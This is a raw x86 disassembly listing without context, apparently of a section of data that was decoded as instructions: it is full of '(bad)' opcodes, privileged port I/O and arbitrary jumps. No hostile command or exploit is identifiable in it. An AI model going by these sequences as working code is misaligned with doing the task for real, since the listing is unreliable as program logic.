  418fde:	(bad)  
  418fdf:	push   ds
  418fe0:	cld    
  418fe1:	mov    ecx,0xeb67b7a7
	...
  41900e:	add    BYTE PTR [eax],al
  419010:	xor    BYTE PTR [edi],ch
  419012:	clc    
  419013:	cmp    DWORD PTR ds:0x50ed71b8,0x4f
  41901a:	(bad)  
  41901b:	mov    dl,0x7a
  41901d:	mov    bh,0xa
  41901f:	sub    DWORD PTR [ecx+0x4574fd61],edi
  419025:	rol    BYTE PTR [ebx-0x1646cd02],0x19
  41902c:	sub    ebp,DWORD PTR [edi]
  41902e:	clc    
  41902f:	shl    DWORD PTR [edi-0x143102b0],0xb7
  419036:	cmp    eax,0x43a04228
  41903b:	mov    ebp,0xe9005b3a
  419040:	rcr    BYTE PTR [esi],0xfc
  419043:	sbb    DWORD PTR [edi+esi*4+0x41aaeb67],edx
  41904a:	add    BYTE PTR [esi-0x302a451],bl
  419050:	int3   
  419051:	and    al,0x3f
  419053:	jmp    0x4f2b8e
  419058:	stos   DWORD PTR es:[edi],eax
  419059:	inc    edx
  41905a:	std    
  41905b:	jmp    DWORD PTR [edi]
  41905d:	js     0x4190a3
  41905f:	fdiv   st,st(7)
  419061:	pop    edx
  419062:	add    BYTE PTR [eax],al
  419064:	fdiv   st,st(6)
  419066:	fld    DWORD PTR [ecx]
  419068:	daa    
  419069:	pop    ebx
  41906a:	add    bh,bh
  41906c:	hlt    
  41906d:	mov    dh,0x8e
  41906f:	inc    ebp
  419070:	ja     0x4190c2
  419072:	jb     0x41907c
	...
  41909c:	add    BYTE PTR [eax],al
  41909e:	pusha  
  41909f:	mul    cl
  4190a1:	(bad)  
  4190a2:	stos   BYTE PTR es:[edi],al
  4190a3:	cmp    ch,0xff
  4190a6:	out    0x5a,eax
  4190a8:	lds    eax,FWORD PTR [ebp-0x7d]
  4190ab:	pop    edi
  4190ac:	add    BYTE PTR [eax],al
  4190ae:	xlat   BYTE PTR ds:[ebx]
  4190af:	ja     0x4190f5
  4190b1:	lock out 0x5a,eax
  4190b4:	add    BYTE PTR [eax],al
  4190b6:	sbb    dh,dh
  4190b8:	icebp  
  4190b9:	add    bh,dl
  4190bb:	pop    edx
  4190bc:	add    BYTE PTR [ebp-0xb28d66],cl
  4190c2:	cmp    cl,BYTE PTR [esi-0x1b]
  4190c5:	in     eax,0xa4
  4190c7:	pop    edx
  4190c8:	add    BYTE PTR [ebx],cl
  4190ca:	push   edi
  4190cb:	retf   
  4190cc:	adc    eax,0xfd661283
  4190d1:	jae    0x419061
  4190d3:	dec    edi
  4190d4:	je     0x4190ca
  4190d6:	and    BYTE PTR [ebp+0x5f5648c2],dh
  4190dc:	lds    eax,FWORD PTR [ebp-0x35]
  4190df:	pop    ecx
  4190e0:	add    BYTE PTR [eax],al
  4190e2:	add    DWORD PTR ds:0x1ac7,0x6b
  4190e8:	std    
  4190e9:	call   DWORD PTR [edi+0x5a]
  4190ec:	std    
  4190ed:	jne    0x419082
  4190ef:	dec    edi
  4190f0:	adc    al,0x85
  4190f2:	or     al,0x9a
  4190f4:	std    
  4190f5:	or     ah,BYTE PTR [edi+0x3ee81be6]
  4190fb:	mov    ds:0x4141fe1a,al
  419100:	(bad)  
  419101:	jl     0x419103
	...
  41912b:	add    BYTE PTR [ebp-0x55fffb7d],al
  419131:	mov    esi,0x79ab1414
  419136:	sar    edi,0xf8
  419139:	mov    esi,0xc47f4740
  41913e:	add    al,BYTE PTR [eax]
  419140:	ds inc esp
  419142:	cmp    BYTE PTR [edx+esi*8-0x3d],0x8d
  419147:	or     al,BYTE PTR [ecx]
  419149:	(bad)  
  41914a:	or     eax,0x292073fe
  41914f:	mov    edi,DWORD PTR ds:0x73ff01c4
  419155:	jo     0x419180
  419157:	jae    0x419198
  419159:	les    eax,FWORD PTR [ecx]
  41915b:	cld    
  41915c:	or     eax,0xd1fe5a84
  419161:	push   esp
  419162:	adc    al,0xf1
  419164:	cwde   
  419165:	mov    edi,esp
  419167:	push   cs
  419168:	mov    ebx,0xb9fe14a1
  41916d:	sub    al,bh
  41916f:	or     dl,BYTE PTR [ebp-0x5799813c]
  419175:	lods   al,BYTE PTR ds:[esi]
  419176:	adc    DWORD PTR [edi+0x1c43f],esi
  41917c:	stc    
  41917d:	sbb    BYTE PTR [ebx],bh
  41917f:	ret    0x28eb
  419182:	and    BYTE PTR [edx+0x57b48f82],al
  419188:	push   ss
  419189:	mov    bh,0x3
  41918b:	inc    ecx
  41918c:	ds pushf 
  41918e:	xchg   esi,eax
	...
  4191b7:	add    BYTE PTR [eax],al
  4191b9:	add    BYTE PTR [ebp-0xc],bh
  4191bc:	sahf   
  4191bd:	jmp    DWORD PTR [ecx+0x43]
  4191c0:	push   es
  4191c1:	add    BYTE PTR [esi],bh
  4191c3:	pushf  
  4191c4:	shl    BYTE PTR [eax],cl
  4191c6:	pop    ecx
  4191c7:	pop    edx
  4191c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4191c9:	sbb    al,0x52
  4191cb:	scas   eax,DWORD PTR es:[edi]
  4191cc:	sahf   
  4191cd:	adc    esp,DWORD PTR [ecx-0x5c]
  4191d0:	into   
  4191d1:	adc    al,BYTE PTR [eax-0x3e]
  4191d4:	(bad)  
  4191d5:	jmp    0x41920f
  4191d7:	mov    ch,0xf2
  4191d9:	inc    ebx
  4191da:	lods   eax,DWORD PTR ds:[esi]
  4191db:	dec    eax
  4191dc:	(bad)  
  4191dd:	sub    eax,0xff76b461
  4191e2:	loope  0x419213
  4191e4:	loope  0x419230
  4191e6:	inc    edx
  4191e7:	xor    eax,0x5c11c4b4
  4191ec:	out    0x3,eax
  4191ee:	ds inc ebx
  4191f0:	call   0x3f9ccff9
  4191f5:	ret    0xb453
  4191f8:	inc    esi
  4191f9:	addr16 test al,0x28
  4191fc:	test   al,0x3
  4191fe:	add    DWORD PTR [edi],ebx
  419200:	xor    eax,DWORD PTR ds:0x80e75b3f
  419206:	xor    BYTE PTR [edi-0x13f5ed49],0x9a
  41920d:	(bad)  
  41920e:	leave  
  41920f:	mov    esp,0x5b3e058f
  419214:	loop   0x419259
  419216:	xor    cl,BYTE PTR [esi+0x6]
  419219:	fld1   
  41921b:	sub    BYTE PTR [eax+0x3],ch
	...
  419245:	add    BYTE PTR [eax],al
  419247:	add    BYTE PTR [esi-0x5fed229a],dl
  41924d:	pushf  
  41924e:	in     al,0x5a
  419250:	or     al,0x1a
  419252:	out    0x3,eax
  419254:	ds pop ebx
  419256:	out    0x1b,eax
  419258:	jmp    0x4192b0
  41925a:	(bad)  
  41925b:	adc    bl,BYTE PTR [ecx+0x7812f076]
  419261:	inc    ebx
  419262:	sbb    eax,0xcf5afecb
  419267:	cmp    DWORD PTR [edx-0x4c],esi
  41926a:	add    BYTE PTR [esi+0x62539922],dh
  419270:	cmp    DWORD PTR [eax+ebx*2],esp
  419273:	adc    eax,edi
  419275:	pop    ecx
  419276:	aas    
  419277:	jmp    0xaa40bcb1
  41927c:	sub    al,0x42
  41927e:	add    BYTE PTR [ecx-0x16ffa47e],al
  419284:	test   DWORD PTR [ebp+edi*8-0x3d5dc217],esi
  41928b:	in     eax,dx
  41928c:	cmp    eax,0x4c01580b
  419291:	pop    edx
  419292:	aas    
  419293:	jmp    0x2a40bcdd
  419298:	sub    al,0x3c
  41929a:	mov    cl,0xeb
  41929c:	cli    
  41929d:	mov    bl,0xe5
  41929f:	add    DWORD PTR [edx+0x5b],0xb4df5100
  4192a6:	std    
  4192a7:	ds inc ebp
  4192a9:	and    esi,ebx
  4192ab:	add    BYTE PTR ss:[eax],al
	...
  4192d6:	dec    esp
  4192d7:	mov    esp,0xb52c36ed
  4192dc:	call   0xfdf6d821
  4192e1:	push   0xffffffee
  4192e3:	xor    eax,0x5b3da84b
  4192e8:	je     0x4192da
  4192ea:	shl    BYTE PTR [esi+0x7b],0xb2
  4192ee:	jp     0x4192a3
  4192f0:	std    
  4192f1:	jne    0x41932a
  4192f3:	mov    ah,0x13
  4192f5:	je     0x4192d7
  4192f7:	sbb    al,BYTE PTR [eax]
  4192f9:	es inc esi
  4192fb:	cwde   
  4192fc:	dec    eax
  4192fd:	sub    BYTE PTR [edx],bh
  4192ff:	pop    edx
  419300:	add    cl,ch
  419302:	mov    ebp,0x2fd515bb
  419307:	mov    ch,0xe8
  419309:	repz dec eax
  41930b:	mov    ch,0xfd
  41930d:	add    BYTE PTR [esi+ebp*8+0x5e726855],ah
  419314:	aas    
  419315:	add    BYTE PTR [edi-0x573cff34],ch
  41931b:	push   esi
  41931c:	xor    eax,0xb7576701
  419321:	pop    es
  419322:	push   edi
  419323:	push   edi
  419324:	add    BYTE PTR [ebx],dh
  419326:	test   DWORD PTR [ecx-0x10],edx
  419329:	or     ebp,0x5a
  41932c:	jae    0x419330
  41932e:	int3   
  41932f:	pop    ecx
  419330:	jmp    0xff20631e
  419335:	jmp    FWORD PTR [eax+0xfa724f]
	...
  419363:	add    BYTE PTR [eax+0x6f00674c],ch
  419369:	xchg   edx,eax
  41936a:	add    BYTE PTR [eax],al
  41936c:	pop    ss
  41936d:	jae    0x41936d
  41936f:	and    eax,0x40de2b
  419374:	mov    BYTE PTR [edx+0x5ea6813d],bh
  41937a:	std    
  41937b:	and    eax,0x40dda3
  419380:	sub    BYTE PTR [edx+0x5ea68145],bh
  419386:	std    
  419387:	and    eax,0x40dd8b
  41938c:	sub    BYTE PTR [edx+0x5e96814d],bh
  419392:	std    
  419393:	and    eax,0x40ddf3
  419398:	cmp    BYTE PTR [edx+0x5ed68155],bh
  41939e:	std    
  41939f:	and    eax,0x40ddcb
  4193a4:	test   al,0xb9
  4193a6:	pop    ebp
  4193a7:	and    DWORD PTR [esi+0x57],0xde0325fd
  4193ae:	inc    eax
  4193af:	add    BYTE PTR [esi],bh
  4193b1:	mov    esi,esp
  4193b3:	addr16 mov edi,0x1bff0483
  4193b9:	or     BYTE PTR [ecx-0x190ec1c0],al
  4193bf:	outs   dx,DWORD PTR ds:[esi]
  4193c0:	mov    edi,0x23ff0483
  4193c5:	push   0x4081
	...
  4193f2:	ds stc 
  4193f4:	out    0x77,al
  4193f6:	mov    edi,0x1bff0483
  4193fb:	dec    eax
  4193fc:	add    DWORD PTR [eax+0x3e],0xbf7fe6e1
  419403:	add    BYTE PTR [edi+edi*8],0x63
  419407:	cmp    BYTE PTR [edx-0x19d6c1c0],al
  41940d:	xchg   DWORD PTR [edi+0x5bff0482],edi
  419413:	sub    BYTE PTR [edx-0x19eec1c0],al
  419419:	(bad)  
  41941a:	mov    edi,0x23ff0202
  41941f:	sub    BYTE PTR [edx-0x19e6c1c0],al
  419425:	xchg   edi,eax
  419426:	mov    edi,0x1bff0202
  41942b:	or     BYTE PTR [edx-0x197ec1c0],al
  419431:	lahf   
  419432:	mov    edi,0x23ff0202
  419437:	sbb    BYTE PTR [edx-0x19b6c1c0],al
  41943d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41943e:	mov    edi,0x5bff0202
  419443:	or     BYTE PTR [edx-0x1c4ec1c0],al
  419449:	scas   eax,DWORD PTR es:[edi]
  41944a:	mov    edi,0x63ff0202
  41944f:	push   0x5b3e4082
  419454:	out    0xe9,al
	...
  41947e:	add    BYTE PTR [eax],al
  419480:	rcr    ebx,1
  419482:	sub    BYTE PTR [ecx+eax*4],al
  419485:	ja     0x41941a
  419487:	test   esi,edi
  419489:	pop    edx
  41948a:	into   
  41948b:	jmp    0x46a7041
  419490:	imul   esi,DWORD PTR [edi-0x5d],0xb65afe85
  419497:	jmp    0x46a701d
  41949c:	push   ecx
  41949d:	ja     0x419452
  41949f:	test   esi,edi
  4194a1:	pop    edx
  4194a2:	sahf   
  4194a3:	jmp    0x46a7019
  4194a8:	cmp    DWORD PTR [edi-0x4d],esi
  4194ab:	test   DWORD PTR [esi+0x5b],edi
  4194ae:	xchg   cl,ch
  4194b0:	adc    ebx,ebx
  4194b2:	sub    BYTE PTR [ecx+eiz*1],al
  4194b5:	ja     0x41944a
  4194b7:	test   DWORD PTR [esi+0x5b],edi
  4194ba:	outs   dx,BYTE PTR ds:[esi]
  4194bb:	jmp    0x3ea6fb1
  4194c0:	or     DWORD PTR [edi+0x43],esi
  4194c3:	test   DWORD PTR [esi+0x5b],edi
  4194c6:	push   esi
  4194c7:	jmp    0x3ea6fad
  4194cc:	icebp  
  4194cd:	jbe    0x419522
  4194cf:	test   DWORD PTR [esi+0x5b],edi
  4194d2:	ds jmp 0x3ea6fa9
  4194d8:	fnstenv [esi+0x33]
  4194db:	test   DWORD PTR [esi+0x5b],edi
  4194de:	es jmp 0x3ea6fb5
	...
  41950c:	add    BYTE PTR [eax],al
  41950e:	shl    DWORD PTR [esi+0x13],0x85
  419512:	(bad)  
  419513:	pop    edx
  419514:	push   cs
  419515:	jmp    0x3ea6fcb
  41951a:	test   eax,0xfe81e376
  41951f:	pop    edx
  419520:	add    dh,dh
  419522:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419523:	pop    eax
  419524:	sub    BYTE PTR [eax-0x6dc4fc3],0xbf
  41952b:	sbb    eax,DWORD PTR [eax]
  41952d:	ficom  WORD PTR [esi+0x4228824c]
  419533:	mov    al,0x23
  419535:	icebp  
  419536:	mov    edi,0x56c6001b
  41953b:	push   esp
  41953c:	sub    BYTE PTR [eax],0x3a
  41953f:	mov    al,0x23
  419541:	or     DWORD PTR [ebx+ebx*1+0x7c66ae00],edi
  419548:	sub    BYTE PTR [eax],0x42
  41954b:	mov    al,0x23
  41954d:	int    0xbf
  41954f:	sbb    eax,DWORD PTR [eax]
  419551:	xchg   esi,eax
  419552:	es ins BYTE PTR es:[edi],dx
  419554:	sub    BYTE PTR [eax],0x3a
  419557:	mov    al,0x23
  419559:	sar    DWORD PTR [edi+0x167e001a],0x74
  419560:	sub    BYTE PTR [eax],0x42
  419563:	mov    al,0x23
  419565:	sub    DWORD PTR [edx+ebx*1+0x1c166600],edi
  41956c:	sub    BYTE PTR [eax-0x5edc4fc3],0x0
	...
  41959b:	add    BYTE PTR [edi-0x19b1ffe6],bh
  4195a1:	and    eax,DWORD PTR [edx+0x23b03da8]
  4195a7:	cdq    
  4195a8:	mov    edi,0xe636001a
  4195ad:	or     eax,DWORD PTR [edx+0x23b03da8]
  4195b3:	sar    DWORD PTR [edi-0x29e1ffe6],0x13
  4195ba:	sub    BYTE PTR [eax-0x7adc4fc3],0xbf
  4195c1:	sbb    al,BYTE PTR [eax]
  4195c3:	add    BYTE PTR [eax-0x3d],al
  4195c6:	imul   eax,DWORD PTR [edx+0x25fd5bd6],0x40da17
  4195d0:	mov    al,ds:0x568275b7
  4195d5:	push   edi
  4195d6:	std    
  4195d7:	and    eax,0x40dce3
  4195dc:	nop
  4195dd:	mov    bh,0x7d
  4195df:	and    BYTE PTR [esi],0x57
  4195e2:	std    
  4195e3:	and    eax,0x40dcdb
  4195e8:	mov    al,ds:0x268285b7
  4195ed:	push   edi
  4195ee:	std    
  4195ef:	and    eax,0x40dcf3
  4195f4:	mov    al,ds:0x168291b7
  4195f9:	push   edi
  4195fa:	std    
  4195fb:	and    eax,0x40d9af
	...
  419628:	add    BYTE PTR [eax],al
  41962a:	shl    BYTE PTR [esi+0x57568299],0xfd
  419631:	and    eax,0x40d977
  419636:	nop
  419637:	mov    dh,0xa1
  419639:	and    BYTE PTR [esi+0x57],0xfd
  41963d:	and    eax,0x40d9af
  419642:	pusha  
  419643:	mov    dh,0xa9
  419645:	and    BYTE PTR [esi-0x28da02a6],0xd9
  41964c:	inc    eax
  41964d:	add    BYTE PTR [eax-0x697d4e4a],al
  419653:	pop    edx
  419654:	std    
  419655:	and    eax,0x40d94f
  41965a:	and    BYTE PTR [esi+0x5a9682bd],dh
  419660:	std    
  419661:	and    eax,0x40d91b
  419666:	ds cmp eax,ecx
  419669:	and    edi,DWORD PTR [edx]
  41966b:	inc    ecx
  41966c:	or     al,0x1
  41966e:	sub    ebp,DWORD PTR [ecx+ecx*2+0x1c43e63]
  419675:	ret    0xc442
  419678:	xor    bh,0x3a
  41967b:	aas    
  41967c:	stc    
  41967d:	mov    bh,0x3c
  41967f:	les    eax,FWORD PTR [ecx]
  419681:	add    BYTE PTR [eax+edi*4+0x1],bh
  419685:	xor    DWORD PTR [esi-0x44],0xffffff8e
  419689:	pop    es
  41968a:	mov    dh,0xb8
  41968c:	add    DWORD PTR [eax],eax
	...
  4196b6:	add    BYTE PTR [eax],al
  4196b8:	add    al,BYTE PTR ds:[esi]
  4196bb:	add    BYTE PTR [ebp+0x467cf19c],bh
  4196c1:	sub    al,0x3
  4196c3:	add    BYTE PTR [esi],bh
  4196c5:	les    edi,FWORD PTR [edi]
  4196c7:	add    edi,DWORD PTR [esi]
  4196c9:	inc    ecx
  4196ca:	or     DWORD PTR [edi],ebx
  4196cc:	ret    
  4196cd:	stos   DWORD PTR es:[edi],eax
  4196ce:	dec    ecx
  4196cf:	pop    es
  4196d0:	les    eax,FWORD PTR ds:[ecx]
  4196d3:	ret    0xc43a
  4196d6:	xor    bh,0x7e
  4196d9:	push   edi
  4196da:	cld    
  4196db:	mov    bh,0x34
  4196dd:	les    eax,FWORD PTR [ecx]
  4196df:	add    ah,bh
  4196e1:	mov    edi,0xc3be3d01
  4196e6:	add    DWORD PTR [eax],eax
  4196e8:	mov    ebp,DWORD PTR [ecx+ecx*2+0x1c43e0b]
  4196ef:	ret    0xc442
  4196f2:	into   
  4196f3:	(bad)  
  4196f4:	les    eax,FWORD PTR ds:[ecx]
  4196f7:	jge    0x41972f
  4196f9:	fdiv   st(3),st
  4196fb:	jmp    ecx
  4196fd:	ret    
  4196fe:	aas    
  4196ff:	add    edi,DWORD PTR [esi]
  419701:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419702:	add    DWORD PTR [edx],eax
  419704:	les    ecx,FWORD PTR ds:[esi-0x8a579f9]
  41970b:	add    edi,DWORD PTR [esi]
  41970d:	pop    ebx
  41970e:	sub    DWORD PTR [edi],eax
  419710:	ds jo  0x4196fa
  419713:	pop    es
  419714:	ds pop ebx
  419716:	mov    ebx,?
  419718:	icebp  
  419719:	dec    eax
  41971a:	out    0x3,eax
	...
  419744:	add    BYTE PTR [eax],al
  419746:	ds cdq 
  419748:	jecxz  0x41974d
  41974a:	pop    ebx
  41974b:	pop    ebx
  41974c:	fild   WORD PTR [ebx]
  41974e:	ds xor bh,bl
  419751:	dec    ebx
  419752:	sub    eax,0x7c03e75b
  419757:	push   esi
  419758:	out    0xc8,eax
  41975a:	jns    0x4197b9
  41975c:	out    0x3,eax
  41975e:	repz bound ecx,QWORD PTR [edi-0x1852960e]
  419765:	inc    ebp
  419766:	cmp    eax,0x1e03fc5b
  41976b:	pop    ebx
  41976c:	out    0x88,eax
  41976e:	cmp    ebx,esi
  419770:	iret   
  419771:	add    edi,DWORD PTR [esi]
  419773:	pop    ebx
  419774:	test   eax,0xe7703e00
  419779:	ret    
  41977a:	cmp    DWORD PTR [ebp+0x51e9fc14],ebp
  419780:	out    0x3,eax
  419782:	ds cdq 
  419784:	jmp    0x419789
  419786:	arpl   WORD PTR [ebx+0x67],bx
  419789:	add    al,0x3e
  41978b:	fisttp WORD PTR cs:[ebx+0x35]
  41978f:	pop    ebx
  419790:	out    0x3,eax
  419792:	cld    
  419793:	push   edi
  419794:	out    0xd6,eax
  419796:	imul   BYTE PTR [esi-0x19]
  419799:	add    edi,DWORD PTR [edi]
  41979b:	pop    ebx
  41979c:	out    0x68,al
  41979e:	(bad)  
  41979f:	ficomp WORD PTR [ebx+0x28e04bfc]
  4197a5:	inc    esi
  4197a6:	cmp    eax,0x856a5b
	...
  4197d3:	add    BYTE PTR ds:0x3de90057,dh
  4197d9:	lods   al,BYTE PTR ds:[esi]
  4197da:	jae    0x4197a8
  4197dc:	dec    eax
  4197dd:	fist   DWORD PTR [eax]
  4197df:	in     eax,dx
  4197e0:	cmp    eax,0xaa68875b
  4197e5:	pop    eax
  4197e6:	add    cl,ch
  4197e8:	jge    0x41977f
  4197ea:	jg     0x4197d9
  4197ec:	test   eax,0x3df1fdac
  4197f1:	pop    ebx
  4197f2:	add    BYTE PTR [eax-0x3d],dh
  4197f5:	pop    esp
  4197f6:	add    al,0xe9
  4197f8:	cmp    eax,0x89c57cd8
  4197fd:	lods   al,BYTE PTR ds:[esi]
  4197fe:	mov    dh,BYTE PTR [eax-0x6b]
  419801:	pop    eax
  419802:	add    cl,ch
  419804:	leave  
  419805:	popa   
  419806:	mov    ch,al
  419808:	cmp    ebx,DWORD PTR [ebx+0x5ae5a9fe]
  41980e:	ret    0x3ded
  419811:	mov    ebx,DWORD PTR [edi]
  419813:	stos   DWORD PTR es:[edi],eax
  419814:	pop    ecx
  419815:	lods   al,BYTE PTR ds:[esi]
  419816:	sub    BYTE PTR [eax+0x59],0x58
  41981a:	add    cl,ch
  41981c:	xor    al,0x27
  41981e:	sbb    esi,DWORD PTR [edx-0x46]
  419821:	pop    esp
  419822:	add    al,0xe9
  419824:	cmp    eax,0x31f17fe2
  419829:	lods   al,BYTE PTR ds:[esi]
  41982a:	std    
  41982b:	sub    DWORD PTR [ebp-0x25],edi
  41982e:	sbb    al,0xed
  419830:	cmp    eax,0x3de9085b
  419835:	pop    ebx
  419836:	xchg   DWORD PTR [eax+0x0],ebp
	...
  419861:	add    BYTE PTR ds:0x88e90058,cl
  419867:	jecxz  0x419881
  419869:	in     eax,dx
  41986a:	cmp    eax,0x8108d05b
  41986f:	fnstcw WORD PTR [edi-0xb]
  419872:	icebp  
  419873:	stos   DWORD PTR es:[edi],eax
  419874:	std    
  419875:	dec    esi
  419876:	into   
  419877:	dec    esi
  419878:	mov    DWORD PTR [eax],eax
  41987a:	push   esi
  41987b:	test   al,0x1
  41987d:	add    bh,ah
  41987f:	sbb    BYTE PTR cs:[eax],0xe3
  419883:	push   edi
  419884:	add    BYTE PTR [eax+0x20],al
  419887:	xlat   BYTE PTR ds:[ebx]
  419888:	sbb    DWORD PTR [edi+edx*8],eax
  41988b:	push   edi
  41988c:	or     BYTE PTR [eax],al
  41988e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41988f:	push   edi
  419890:	xchg   DWORD PTR [ecx-0x25449],eax
  419896:	sbb    al,0x2f
  419898:	adc    eax,0x8a579704
  41989d:	add    DWORD PTR [ebp+0x1fc0fb17],esp
  4198a3:	push   edi
  4198a4:	ror    DWORD PTR [ebx-0x74fe741d],0x43
  4198ab:	mov    ebx,0xea315501
  4198b0:	xor    dh,dh
  4198b2:	(bad)  
  4198b4:	std    
  4198b5:	mov    cl,BYTE PTR [edi-0x39fe192b]
  4198bb:	dec    esi
  4198bc:	inc    ebx
  4198bd:	lea    esi,[ebx-0x16]
  4198c0:	cmp    al,0x66
  4198c3:	retf   0x83ed
	...
  4198ee:	add    BYTE PTR [eax],al
  4198f0:	mov    DWORD PTR [edi-0x45],edx
  4198f3:	call   FWORD PTR [eax+0x5a8dfe61]
  4198f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4198fa:	jno    0x41996e
  4198fc:	je     0x419926
  4198fe:	inc    BYTE PTR [ecx]
  419900:	jle    0x4198b5
  419902:	add    DWORD PTR [eax],eax
  419904:	pop    ss
  419905:	ficomp DWORD PTR [eax]
  419907:	mov    esp,DWORD PTR [esi+0x270001af]
  41990d:	sbb    BYTE PTR es:[eax],0x23
  419911:	pop    edi
  419912:	add    BYTE PTR [eax-0x72],al
  419915:	push   ss
  419916:	sbb    DWORD PTR [edi+eiz*8],eax
  419919:	pop    esi
  41991a:	xchg   DWORD PTR [ecx-0x25bc2],eax
  419920:	jmp    0x3a591a62
  419925:	mov    ah,0x1
  419927:	idiv   ah
  419929:	mov    bl,0x8d
  41992b:	or     esp,eax
  41992d:	mov    WORD PTR [ebx],es
  41992f:	fcmovne st,st(0)
  419931:	jne    0x4199af
  419933:	pop    ss
  419934:	aad    0xb6
  419936:	xor    DWORD PTR [edi],ebx
  419938:	aas    
  419939:	or     ebp,eax
  41993b:	add    edi,DWORD PTR [esi]
  41993d:	mov    ah,0x8e
  41993f:	sbb    BYTE PTR [ebp+0x3e03f433],dh
  419945:	mov    ah,0x7a
  419947:	xor    BYTE PTR [esi],0xc0
  41994a:	add    DWORD PTR [eax],eax
  41994c:	(bad)  
  41994d:	cmp    cl,BYTE PTR [ecx+0x1b]
  419950:	inc    edx
  419951:	mov    ah,0x1
  419953:	mov    DWORD PTR [eax],eax
	...
  41997d:	add    BYTE PTR [edi+0x79fffda4],bh
  419983:	sub    eax,0xb43a1782
  419988:	add    DWORD PTR [edx-0x2d349ba],ecx
  41998e:	jge    0x419953
  419990:	sbb    eax,DWORD PTR [edx+0x1779b368]
  419996:	retf   
  419997:	add    eax,0x989700ac
  41999c:	std    
  41999d:	inc    DWORD PTR [ecx+0x47]
  4199a0:	jmp    0xfde5592f
  4199a5:	push   DWORD PTR [ecx]
  4199a7:	cmp    eax,DWORD PTR [edx+0x1b44217]
  4199ad:	inc    eax
  4199ae:	mov    bh,0x1a
  4199b0:	in     eax,0x3
  4199b2:	ds mov ah,0x7a
  4199b5:	sub    BYTE PTR [esi],0xb8
  4199b8:	add    DWORD PTR [eax],eax
  4199ba:	mov    ch,0x32
  4199bc:	jmp    0xe79cd7c4
  4199c1:	adc    edi,edi
  4199c3:	pop    ebx
  4199c4:	sar    ebp,cl
  4199c6:	(bad)  
  4199c7:	dec    edx
  4199c8:	jmp    0x5fde8502
  4199cd:	repz aam 0x5c
  4199d0:	pop    ss
  4199d1:	jecxz  0x419a11
  4199d3:	hlt    
  4199d4:	(bad)  
  4199d6:	shr    DWORD PTR [ecx-0x244b1544],1
  4199dc:	xlat   BYTE PTR ds:[ebx]
  4199dd:	inc    ecx
  4199df:	test   eax,0x8270
	...
  419a0c:	push   ecx
  419a0d:	pop    edi
  419a0e:	out    0x3,eax
  419a10:	(bad)  
  419a11:	rcl    DWORD PTR [eax-0x19],cl
  419a14:	cmp    eax,0xbe7ae75b
  419a19:	dec    edx
  419a1a:	jmp    0x419a1f
  419a1c:	ds (bad) 
  419a1e:	jo     0x419a0b
  419a20:	cmp    eax,0x5e33e75b
  419a25:	or     cl,BYTE PTR [ebp-0x18a1805a]
  419a2b:	mov    dl,0x12
  419a2d:	(bad)  
  419a2e:	dec    ebx
  419a2f:	loopne 0x419a72
  419a31:	adc    DWORD PTR [edx],ebx
  419a33:	inc    esp
  419a34:	adc    dh,bl
  419a36:	int3   
  419a37:	imul   ebx
  419a39:	pop    edi
  419a3a:	test   bh,dh
  419a3c:	pop    ecx
  419a3d:	test   eax,0x7ed57ae7
  419a42:	fstp   TBYTE PTR [edx+0x50]
  419a45:	jne    0x4199fb
  419a47:	jns    0x419a26
  419a49:	jle    0x419a32
  419a4b:	jns    0x419aa5
  419a4d:	ffreep st(2)
  419a4f:	nop
  419a50:	push   ecx
  419a51:	aam    0xa4
  419a53:	jnp    0x419a68
  419a55:	xlat   BYTE PTR ds:[ebx]
  419a56:	jb     0x419a5c
  419a58:	ds pop ebx
  419a5a:	out    0xc9,eax
  419a5c:	aaa    
  419a5d:	das    
  419a5e:	in     eax,0xbc
  419a60:	jg     0x419a40
  419a62:	add    BYTE PTR [eax-0x567e5151],ah
  419a68:	add    eax,esp
  419a6a:	(bad)  
  419a6b:	fdivr  st(5),st
  419a6d:	ffree  st(0)
  419a6f:	jmp    0x419a71
	...
  419a99:	add    BYTE PTR [ebp+ebx*2-0x7f],dl
  419a9d:	sub    ecx,ebp
  419a9f:	and    DWORD PTR [esi+0x6a],eax
  419aa2:	(bad)  
  419aa3:	jl     0x419ac1
  419aa5:	call   0x9f9f3158
  419aaa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419aab:	add    eax,0xd43de5c2
  419ab0:	push   esp
  419ab1:	add    eax,0x72560e3e
  419ab6:	push   ebx
  419ab7:	mov    eax,ds:0xa8b1d186
  419abc:	std    
  419abd:	jmp    0x6341f5ff
  419ac2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ac3:	fadd   st(7),st
  419ac5:	neg    BYTE PTR [ecx]
  419ac7:	js     0x419ac8
  419ac9:	call   0x75caab0b
  419ace:	imul   ecx,DWORD PTR [ecx+eax*4-0x12],0xa6032e88
  419ad6:	jo     0x419a80
  419ad8:	std    
  419ad9:	jmp    0xae6b34d2
  419ade:	in     eax,dx
  419adf:	popa   
  419ae0:	or     BYTE PTR [ebp-0x5c],dl
  419ae3:	sbb    DWORD PTR [eax+0x6c],eax
  419ae6:	inc    eax
  419ae7:	das    
  419ae8:	imul   BYTE PTR [edx-0x2d]
  419aeb:	inc    ebx
  419aec:	add    al,0xe9
  419aee:	cmp    eax,0xc4cc73a8
  419af3:	fst    QWORD PTR [eax]
  419af5:	in     eax,dx
  419af6:	cmp    eax,0x2567875b
  419afb:	pop    esp
  419afc:	add    cl,ch
	...
  419b26:	add    BYTE PTR [eax],al
  419b28:	std    
  419b29:	mov    al,ds:0xa821ed86
  419b2e:	std    
  419b2f:	add    BYTE PTR [edi],cl
  419b31:	pop    esp
  419b32:	add    BYTE PTR [eax],al
  419b34:	mov    fs,WORD PTR [esi]
  419b36:	or     eax,0x895c1704
  419b3b:	xchg   bh,ch
  419b3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b3e:	std    
  419b3f:	push   DWORD PTR [edi]
  419b41:	mov    esp,0xa7f7868a
  419b46:	std    
  419b47:	call   FWORD PTR [ebp-0x5e]
  419b4a:	pop    esi
  419b4b:	mov    bh,bl
  419b4d:	pusha  
  419b4e:	adc    DWORD PTR [eax],0xffffffeb
  419b51:	pop    ebx
  419b52:	add    BYTE PTR [esi-0x4e],bl
